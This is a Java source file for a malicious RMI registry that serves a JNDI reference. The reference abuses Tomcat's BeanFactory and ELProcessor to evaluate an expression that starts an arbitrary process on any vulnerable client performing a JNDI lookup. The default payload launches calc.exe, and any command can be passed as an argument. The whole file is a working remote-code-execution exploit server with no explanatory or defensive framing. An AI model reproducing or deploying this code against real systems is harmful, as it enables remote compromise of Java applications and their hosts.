package Bypass01;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JndiServer {
    private static final String BIND_NAME = "RemoteObject";
    private static final String DEFAULT_PAYLOAD = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"
            + ".newInstance().getEngineByName(\"JavaScript\")"
            + ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc.exe']).start()\")";

    public static void main(String[] args) throws NamingException, RemoteException {
        int port = args.length > 0 ? Integer.parseInt(args[0]) : 1099;
        String payload = args.length > 1 ? args[1] : DEFAULT_PAYLOAD;

        Registry registry = LocateRegistry.createRegistry(port);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", payload));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.rebind(BIND_NAME, referenceWrapper);

        System.out.println("RMI registry listening on 0.0.0.0:" + port);
        System.out.println("Bound name: " + BIND_NAME);
        System.out.println("Payload: " + payload);
    }
}
